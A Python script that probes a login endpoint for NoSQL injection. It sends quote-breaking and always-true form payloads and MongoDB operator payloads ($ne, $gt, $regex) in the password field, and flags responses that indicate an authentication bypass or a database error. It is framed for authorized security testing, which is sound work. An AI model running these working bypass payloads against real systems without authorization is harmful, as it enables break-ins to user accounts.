#!/usr/bin/env python3
"""Detect NoSQL injection (operator and syntax) on login-style endpoints."""

import argparse
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "security-assessment-scripts/1.0"

NOSQL_ERROR_SIGNATURES = [
  ("MongoDB", r"MongoError|BSONError|BsonException|mongo\.errors"),
  ("CouchDB", r"compilation_error|badarg|couch_db"),
  ("Redis", r"ERR unknown command|WRONGTYPE"),
]


def post(url, body, content_type, timeout=10):
  request = urllib.request.Request(
    url,
    data=body if isinstance(body, bytes) else body.encode(),
    headers={"User-Agent": UA, "Content-Type": content_type},
  )
  try:
    response = urllib.request.urlopen(request, timeout=timeout)
    return getattr(response, "status", response.code), response.read(131072).decode("utf-8", "replace")
  except urllib.error.HTTPError as exc:
    return exc.code, exc.read(131072).decode("utf-8", "replace")
  except (urllib.error.URLError, OSError):
    return None, ""


FORM_PAYLOADS = [
  ("syntax break", "'"),
  ("always-true OR", "' || '1'=='1"),
  ("always-false control", "' || '1'=='2"),
  ("double-quote OR", '" || "1"=="1'),
  ("newline operator bypass", "admin'//"),
]

JSON_PASSWORD_PAYLOADS = [
  ("$ne operator", {"$ne": "invalid-password"}),
  ("$gt operator", {"$gt": ""}),
  ("$regex operator", {"$regex": ".*"}),
]


def main():
  parser = argparse.ArgumentParser(description="Probe login endpoints for NoSQL injection on an authorized target.")
  parser.add_argument("url", help="login endpoint")
  parser.add_argument("--user-field", default="username")
  parser.add_argument("--pass-field", default="password")
  parser.add_argument("--valid-user", default="admin", help="a username known or assumed to exist")
  parser.add_argument("--success-marker", required=True, help="text that only appears on successful login")
  parser.add_argument("--json", action="store_true", help="send JSON bodies instead of form-encoded")
  parser.add_argument("--delay", type=float, default=0.2)
  args = parser.parse_args()

  content_type = "application/json" if args.json else "application/x-www-form-urlencoded"

  def send(user, password):
    if args.json:
      return post(args.url, json.dumps({args.user_field: user, args.pass_field: password}), content_type)
    return post(args.url, urllib.parse.urlencode({args.user_field: user, args.pass_field: password}), content_type)

  baseline_status, baseline_body = send(args.valid_user, "wrongpassword123")
  print(f"[*] baseline (valid user, wrong pass): HTTP {baseline_status}, {len(baseline_body)} bytes\n")

  findings = []

  for label, payload in FORM_PAYLOADS:
    status, body = send(f"{args.valid_user}{payload}", "anything")
    error_hit = next(((name, m) for name, pattern in NOSQL_ERROR_SIGNATURES
                      if (m := re.search(pattern, body, re.IGNORECASE))), None)
    success_hit = args.success_marker in body and args.success_marker not in baseline_body
    flag = "[!]" if (error_hit or success_hit) else "[ ]"
    detail = []
    if error_hit:
      detail.append(f"{error_hit[0]} error signature")
    if success_hit:
      detail.append("success marker present -> auth bypass candidate")
      findings.append((label, payload, "bypass"))
    elif error_hit:
      findings.append((label, payload, "error"))
      detail.append("-> injection reaches the query layer")
    print(f"{flag} {label:<24} payload={payload!r:<20} HTTP {status}" + (f" ({'; '.join(detail)})" if detail else ""))
    time.sleep(args.delay)

  if args.json:
    print("\n[*] JSON operator injection into password field:")
    for label, operator in JSON_PASSWORD_PAYLOADS:
      raw = json.dumps({args.user_field: args.valid_user, args.pass_field: operator})
      status, body = post(args.url, raw, content_type)
      success_hit = args.success_marker in body and args.success_marker not in baseline_body
      flag = "[!]" if success_hit else "[ ]"
      print(f"{flag} {label:<18} body={raw[:70]:<70} HTTP {status}")
      if success_hit:
        findings.append((label, str(operator), "bypass"))
      time.sleep(args.delay)

  print()
  if any(kind == "bypass" for _, _, kind in findings):
    print("[!] Auth bypass candidates found - verify by fetching an authenticated page with the returned session.")
  elif findings:
    print("[!] Injection reaches the query layer (errors observed); craft targeted payloads manually.")
  else:
    print("[+] No NoSQL injection indicators from these payloads.")


if __name__ == "__main__":
  main()
